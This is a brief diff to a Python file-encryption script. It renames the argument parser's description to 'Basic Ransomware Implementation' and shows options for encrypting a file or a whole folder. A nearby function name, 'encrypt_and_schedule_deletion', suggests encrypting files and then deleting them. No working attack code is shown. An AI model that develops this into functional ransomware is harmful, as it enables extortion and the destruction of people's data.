@@ -184,7 +184,7 @@ def encrypt_and_schedule_deletion(path, key, timer):
 if __name__ == "__main__":
     import argparse
 
-    parser = argparse.ArgumentParser(description="File Encryptor Script with a Password")
+    parser = argparse.ArgumentParser(description="Basic Ransomware Implementation")
     parser.add_argument("path", help="Path to encrypt/decrypt, can be a file or an entire folder")
     parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated",
                         type=int)
